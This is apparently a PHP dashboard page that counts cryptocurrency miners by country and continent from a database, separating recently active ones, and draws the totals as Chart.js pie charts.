<?php
require_once dirname(__DIR__, 2).'/assets/php/security.php';

$CountriesQuery = getConn()->query("SELECT ms_lastConnection, ms_status, ms_country FROM miners");
$miners = $CountriesQuery->fetchAll(PDO::FETCH_ASSOC);

$countriesTotal = array();
$countriesMining = array();

$continentsTotal = array();
$continentsMining = array();

$countryNames = json_decode(file_get_contents(dirname(__DIR__, 2) . '/assets/json/countryNames.json'), true);
$continentCodes = json_decode(file_get_contents(dirname(__DIR__, 2) . '/assets/json/continentCodes.json'), true);
$continentNames = json_decode(file_get_contents(dirname(__DIR__, 2) . '/assets/json/continentNames.json'), true);

foreach ($miners as $miner) {
    $minerLastConnection = $miner['ms_lastConnection'];
    $difference = time() - $minerLastConnection;

    $country = $miner['ms_country'] ?? 'Unknown';
    $countryKey = $countryNames[$country] ?? $country;
    $countriesTotal[$countryKey] = ($countriesTotal[$countryKey] ?? 0) + 1;

    $contientKey = $continentNames[$continentCodes[$country] ?? $country] ?? $country;
    $continentsTotal[$contientKey] = ($continentsTotal[$contientKey] ?? 0) + 1;

    if ($difference < 180 && ($miner['ms_status'] == 2 || $miner['ms_status'] == 3)) {
        $countriesMining[$countryKey] = ($countriesMining[$countryKey] ?? 0) + 1;
        $continentsMining[$contientKey] = ($continentsMining[$contientKey] ?? 0) + 1;
    }
}


arsort($countriesMining);
arsort($countriesTotal);
arsort($continentsMining);
arsort($continentsTotal);

?>
<div class="plus-section">
    <div class="plus-box">
        <h2>Total Countries</h2>
        <div>
            <canvas id="chartCountriesTotal"></canvas>
        </div>
    </div>
    <div class="plus-box">
        <h2>Total Mining Countries</h2>
        <div>
            <canvas id="chartCountriesMining"></canvas>
        </div>
    </div>
    <div class="plus-box">
        <h2>Total Continents</h2>
        <div>
            <canvas id="chartContinentsTotal"></canvas>
        </div>
    </div>
    <div class="plus-box">
        <h2>Total Mining Continents</h2>
        <div>
            <canvas id="chartContinentsMining"></canvas>
        </div>
    </div>
</div>

<script type="text/javascript" nonce="<?= $csp_nonce ?>">
    var countriesTotal = <?php echo json_encode($countriesTotal) ?>;
    var countriesMining = <?php echo json_encode($countriesMining) ?>;
    var continentsTotal = <?php echo json_encode($continentsTotal) ?>;
    var continentsMining = <?php echo json_encode($continentsMining) ?>;

    countriesTotalCanvas = document.getElementById('chartCountriesTotal');
    countriesMiningCanvas = document.getElementById('chartCountriesMining');
    continentsTotalCanvas = document.getElementById('chartContinentsTotal');
    continentsMiningCanvas = document.getElementById('chartContinentsMining');

    var myChartCountriesTotal = null;
    var myChartCountriesMining = null;
    var myChartContinentsTotal = null;
    var myChartContinentsMining = null;

    createChartGeo(countriesTotal, myChartCountriesTotal, countriesTotalCanvas);
    createChartGeo(countriesMining, myChartCountriesMining, countriesMiningCanvas);
    createChartGeo(continentsTotal, myChartContinentsTotal, continentsTotalCanvas);
    createChartGeo(continentsMining, myChartContinentsMining, continentsMiningCanvas);

    function createChartGeo(statsData, myChartGeo, ctx) {
        if (myChartGeo != null) {
            myChartGeo.clear();
            myChartGeo.destroy();
        }

        var labels = Object.keys(statsData);
        var data = Object.values(statsData);

        myChartGeo = new Chart(ctx, {
            type: 'pie',
            data: {
                labels: labels,
                datasets: [{
                    data: data,
                    borderWidth: 1,
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                title: {
                    display: true,
                    text: 'Country Stats'
                },
                plugins: {
                    legend: {
                        labels: {
                            color: "white",
                            filter: item => item.text == 'Unknown'
                        },
                    },
                }
            }
        });

        myChartGeo.toggleDataVisibility(labels.indexOf("Unknown"));
        myChartGeo.update();
    }
</script>